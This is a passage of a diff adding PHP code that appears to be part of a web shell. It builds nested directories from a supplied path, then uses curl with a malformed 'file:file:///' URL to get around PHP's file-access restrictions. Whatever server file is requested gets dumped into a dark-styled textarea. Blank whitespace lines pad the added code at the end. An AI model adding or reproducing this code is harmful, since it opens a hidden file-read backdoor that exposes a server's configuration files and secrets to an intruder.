+@chdir("file:"); 
+$level++; 
+
+$hardstyle = @explode("/", $file); // A R I A  
+
+for($a=0;$a<count($hardstyle);$a++){ 
+    if(!empty($hardstyle[$a])){ 
+        if(!file_exists($hardstyle[$a]))  
+            @mkdir($hardstyle[$a]); 
+        @chdir($hardstyle[$a]); 
+        $level++; 
+    } 
+} 
+while($level--) chdir(".."); 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, "file:file:///".$file); 
+echo "<textarea rows='30' cols='120' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0' >"; 
+if(FALSE==curl_exec($ch)) 
+die('Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.'); 
+echo ' </textarea> </FONT>'; 
+curl_close($ch); 
+print '</table>'; 
+} 
+?>		
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
